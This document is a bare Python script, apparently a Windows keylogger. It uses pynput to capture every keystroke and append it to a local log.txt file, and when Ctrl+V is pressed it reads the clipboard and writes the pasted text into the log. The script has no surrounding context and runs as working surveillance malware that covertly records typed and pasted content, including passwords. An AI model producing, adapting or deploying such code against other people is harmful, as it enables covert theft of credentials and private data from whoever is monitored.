from pynput import keyboard
import win32clipboard

class MyException(Exception): pass

def on_press(key):
    ##if key == keyboard.Key.esc:
        raise MyException(key)

# Collect events until released


while 1:
    with keyboard.Listener(
            on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            continue
        except MyException as e:
            log = open("log.txt","a+")
            print('{} was pressed'.format(e.args[0]))
            s = str(format(e.args[0]))
            print('\'\\x16\'')
            if s[0:4] == "Key.":
                if s == "Key.enter":
                    print ("\n")
                    log.write("\n")
                else:
                    print (s[4:len(s)])
                    log.write("["+s[4:len(s)]+"]")
            elif s == '\'\\x16\'':
                print ("TRUE")
                win32clipboard.OpenClipboard()
                text = win32clipboard.GetClipboardData()
                log.write("+V")
                print ("text:",text)
                if  text :
                    log.write("\nCopyData:{\n"+text+"\n}\n")
                win32clipboard.CloseClipboard()
            elif s == '\'\\x03\'':
                log.write("+C")
            else:
                print (s[1])
                log.write(s[1])
            
            log.close()
